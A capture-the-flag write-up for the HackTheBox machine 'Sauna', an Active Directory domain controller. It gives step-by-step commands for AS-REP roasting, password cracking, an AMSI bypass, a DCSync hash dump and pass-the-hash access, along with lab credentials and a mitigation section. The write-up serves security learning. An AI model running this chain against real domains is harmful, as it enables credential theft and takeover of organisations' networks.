# Sauna

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Webpage users

- WinPEAS

__Exploitation__

- Weak password policy

- Kerberoasting - harvest non-preauth responses

__Priv Esc__

- AutoLogon credentials

- DCSync attack

***

This is my guide to the HackTheBox Windows machine _Sauna_.
## User Flag

We'll start _Sauna_ by running my `nmap` scan. By the looks of the running services, this box is an Active Directory domain controller.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```bash
# Nmap 7.80 scan initiated Fri Jun  5 18:02:46 2020 as: nmap -sC -sV -O -oA scan175 10.10.10.175
Nmap scan report for 10.10.10.175
Host is up (0.11s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-06 07:07:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/5%Time=5EDACF34%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h03m51s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-06T07:09:33
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  5 18:07:48 2020 -- 1 IP address (1 host up) scanned in 302.89 seconds
```

Additionally, we'll run a full port scan as well.

```bash
$ sudo nmap -sC -sV -O -p- -oA full175 10.10.10.175
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

This reveals that port 5985 is open, indicating to us that `WinRM 2.0 (Microsoft Windows Remote Management)` is available. This will provide us a potential foothold once we gain credentials.

Next, we'll run `enum4linux`, a tool primarily used to enumerate Windows or Samba systems.

```bash
$ enum4linux 10.10.10.175
```

Nothing of significance is revealed.

Alright, the box is also running `IIS` on port 80, so let's see what we can enumerate on their website. Under the `About Us` tab we find information on the team, who may potentially be users. We'll add them to a users text file.

![](images/users.png)

We'll format the names in a typical way you may see them on an Active Directory environment. Let's go ahead and do a few variants to just to be sure.

```
fergus.smith
shaun.coins
bowie.taylor
sophie.driver
hugo.bear
steven.kerb
fsmith
scoins
btaylor
sdriver
hbear
skerb
```

Without passwords, one of our options on a Windows domain controller using `Kerberos` is something called kerberoasting. [This article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/) is a great resource that goes into better detail on these processes. Essentially, we can use a [tool from Impacket](https://github.com/SecureAuthCorp/impacket) to potential harvest some non-preauth AS_REP responses. This may reveal some password hashes that we can crack.

Using our list, we can run our command `GetNPUsers.py` to attempt to harvest these responses.

```
$ GetNPUsers.py -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcat
```

![](images/kerberoast.png)

Success! This yields a hash for the user `fsmith`. We'll use john to crack the hash and reveal the users password.

```
$ sudo john user.hash --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:22 DONE (2020-06-05 22:58) 0.04357g/s 459204p/s 459204c/s 459204C/s Thing..Thereisnospoon
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We have a few options with these credentials. Let's go ahead and try to remotely connect to the domain controller with evil-winrm.  

```
$ evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
```

We successfully connect. Now we have our foothold, let's collect the user flag.

![](images/user-flag.png)

## Root Flag

Now that we have a foothold, let's upload `winPEAS.exe` to [enumerate the system further](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) and see what options exist for privilege escalation.

```
> upload winPEASany.exe
> ./winPEASany.exe
```

The results come back and it looks like some AutoLogon credentials were found for the user `svc_loanmgr`. We can verify the correct username by using the command `net user /domain`.

![](images/autolog.png)

Let's use these credentials to remotely access the domain controller. We'll also throw `PowerView.ps1` into a `scripts` directory so we can invoke some `PowerSploit` commands during our `evil-winrm` session.

```bash
$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!' -s scripts/
```

Using `evil-winrm` let's bypass AMSI. Next we'll run our `PowerView.ps1` script, then invoke `aclscanner` which will return certain rights and accesses for our user. We can also use [Bloodhound](https://github.com/BloodHoundAD/BloodHound) to find a means of attack.

```
> Bypass-4MSI
> PowerView.ps1
> invoke-aclscanner
```

The results indicate that the user `svc_loanmgr` has the `ExtendedRight` privilege, which we can abuse to perform a `DCSync` attack. This will trick the domain controller into thinking we are a new DC on the network and will sync with us, providing all the user NTLM hashes.

![](images/powerview.png)

This can be accomplished using the `secretsdump.py` tool from Impacket. We'll exit our current remote session and run our command.

```
$ secretsdump.py -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
```

![](images/secrets.png)

Success! We receive NTLM hashes for all the users, including the Administrator. Let's use psexec.py to perform a pass-the-hash attack, and connect to the box as the Administrator.

```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175
```

It was successful and we've escalated our privileges.

![](images/psexec.png)

Finally, let's capture the root flag.

![](images/root-flag.png)


***

### Mitigation

- There a few ways to mitigate the risk of kerberoasting; a strong password policy helps alleviate the chance that someone will crack a hash. Additionally, avoid accounts with pre-authentication. If an organization must have that enabled, they need to have very complex passwords, as the hash is readily exposed.

- AutoLogin credentials should be avoided. If an account must have that enabled, special consideration should be taken regarding the risks of a compromise of that account's privileges.

- A system administrator must understand the implication of a user having the right to DCSync and the implications of a DCSync attack being performed. The user that ends up with this right must be protected. AutoLogin credentials on such a user is poor risk mitigation.

### Final Thoughts

This box was challenging for me, having little experience with `Kerberos` and how to attack it. I learned a lot, and with a little research, it really helped me grasp how these authentication methods function. The `DCSync` privilege escalation was also interesting, I really enjoyed researching what to do with the privileges I had.  
